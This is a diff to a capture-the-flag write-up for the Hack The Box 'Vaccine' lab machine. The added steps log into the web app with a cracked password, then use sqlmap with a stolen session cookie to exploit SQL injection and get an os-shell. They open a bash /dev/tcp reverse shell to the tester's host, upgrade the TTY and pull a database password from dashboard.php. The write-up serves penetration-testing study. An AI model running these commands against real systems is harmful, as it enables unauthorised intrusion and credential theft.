@@ -9,8 +9,10 @@ tags:
   - update
   - Linux
   - fcrackzip
-  - ftp
+  - FTP
   - crackstation
+  - password
+  - sqlmap
 ---
 
 Here are notes from the named target:
@@ -200,14 +202,128 @@ used [CrackStation][post-site] on the MD5 hash:
 Hash	Type	Result
 2cb42f8734ea607eefed3b70af13bbd3	md5	qwerty789
 Color Codes: Green: Exact match, Yellow: Partial match, Red: Not found.
-
-Download CrackStation's Wordlist
 ```
 
+**Login to web with "admin" and "qwerty789"
 
+At the Catalog page search for resords with letter "a" in the search box and then go inspect element and grab the cookie id
 
+```yaml
+PHPSESSID     k3ivqlrh8f7i68p3vis6pmjsal
+```
 
+Make a sqlmap query using this information
 
+```yaml
+                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal"
+        ___
+       __H__                                                                                         
+ ___ ___[,]_____ ___ ___  {1.4.12#stable}                                                            
+|_ -| . [.]     | .'| . |                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                            
+      |_|V...       |_|   http://sqlmap.org                                                          
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:14:46 /2021-01-01/
+
+[20:14:46] [INFO] testing connection to the target URL
+[20:14:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:14:46] [INFO] testing if the target URL content is stable
+[20:14:47] [INFO] target URL content is stable
+[20:14:47] [INFO] testing if GET parameter 'search' is dynamic
+[20:14:47] [INFO] GET parameter 'search' appears to be dynamic
+[20:14:47] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+
+```
+
+sqlmap found database to be postgresql and several sql injection points:
+
+this is the cool thing about sqlmap just add to the end of the connection string the following "--os-shell" and you have a shell to work with on the target server
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal" --os-shell
+.
+.
+.
+---
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] n
+[20:26:49] [WARNING] turning off pre-connect mechanism because of connection reset(s)
+[20:26:49] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
+[20:26:49] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
+os-shell> 
+
+os-shell> uname -a
+do you want to retrieve the command standard output? [Y/n/a] n
+[20:30:50] [INFO] retrieved: 'Linux vaccine 5.3.0-29-generic #31-Ubuntu SMP Fri Jan 17 17:27:26 UT...
+os-shell> 
+
+```
+
+As we now have a shell on the target we can also use net cat locally and set up a listener
+then open a reverse shell back to us from the sqlmap shell:
+
+In a new term...
+
+```yaml
+nc -nlvp 4321
+```
+
+In the sqlmap terminal enter this at your os-shell prompt:
+
+```yaml
+bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
+.
+.
+.
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] n
+[20:26:49] [WARNING] turning off pre-connect mechanism because of con
+[20:26:49] [CRITICAL] connection reset to the target URL. sqlmap is g
+[20:26:49] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) gro
+os-shell> uname -a
+do you want to retrieve the command standard output? [Y/n/a] n
+[20:30:50] [INFO] retrieved: 'Linux vaccine 5.3.0-29-generic #31-Ubun
+
+os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
+do you want to retrieve the command standard output? [Y/n/a] n
+```
+In the nc term we catch the reverse shell:
+
+```yaml
+└─$ nc -nlvp 4321                                                                                1 ⨯
+listening on [any] 4321 ...
+connect to [10.10.14.87] from (UNKNOWN) [10.10.10.46] 39840
+bash: cannot set terminal process group (5248): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ ls
+ls
+base
+global
+pg_commit_ts
+pg_dynshmem
+pg_logical
+pg_multixact
+pg_notify
+pg_replslot
+
+```
+
+upgrade to the tty shell
+
+```yaml
+SHELL=/bin/bash script -q /dev/null
+```
+
+Look aroung and find "dashboard.php' in the /var/www/html folder that has a password for the postgres user:
+```yaml
+ try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+        }
+```
 
 
 
